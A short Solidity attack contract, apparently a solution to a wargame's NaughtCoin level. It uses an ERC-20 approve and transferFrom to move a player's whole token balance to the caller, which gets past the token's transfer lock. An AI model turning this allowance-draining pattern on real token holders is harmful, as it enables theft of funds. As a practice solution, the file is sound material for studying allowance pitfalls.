// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract AttackNaughtCoin {
    INaughtCoin public token;
    address public player;

    constructor(address _tokenAddress, address _player) {
        token = INaughtCoin(_tokenAddress);
        player = _player;
    }

    function attack() external {
        uint256 balance = token.balanceOf(player);

        // Step 1: Player must have already approved THIS contract to spend their tokens
        // Step 2: Now transfer all tokens from player to msg.sender (attacker)
        token.transferFrom(player, msg.sender, balance);
    }
}